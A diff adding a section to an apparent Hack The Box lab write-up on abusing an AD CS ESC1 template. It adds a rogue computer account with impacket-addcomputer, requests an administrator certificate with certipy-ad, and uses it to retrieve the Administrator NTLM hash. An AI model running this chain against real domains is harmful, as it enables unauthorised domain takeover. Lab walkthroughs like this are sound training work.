@@ -15,3 +15,39 @@ This command uses the certificate file administrator.pfx to authenticate to the 
 ```
 certipy-ad auth -pfx administrator.pfx -dc-ip 10.113.155.93
 ```
+
+---
+## Enrolled Computers
+
+Found out that the target Domain Controller is vulnerable to ESC1 Attack, but only as Domain Computer.
+
+```
+cat 20260810082037_Certipy.txt
+[+] User Enrollable Principals      : AUTHORITY.HTB\Domain Computers
+    [!] Vulnerabilities
+      ESC1                              : Enrollee supplies subject and template allows client authentication.
+```
+
+As we can see Domain Computers can abuse ESC1 Attacks, let's therefore add an Computer onto the target.
+
+1. Added Computer
+
+```
+impacket-addcomputer 'authority.htb/svc_ldap' -method LDAPS -computer-name saitama -computer-pass 'password123!' -dc-ip 10.129.229.56
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Successfully added machine account saitama$ with password password123!.
+```
+
+2. Requested administrator.pfx file using the previously created machine account.
+
+```
+certipy-ad req -u saitama$ -password 'password123!' -ca AUTHORITY-CA -dc-ip 10.129.229.56 -template CorpVPN -upn administrator@authority.htb
+```
+
+3. Retrieved NTLM Hash of Administrator User.
+
+```
+certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.229.56
+```
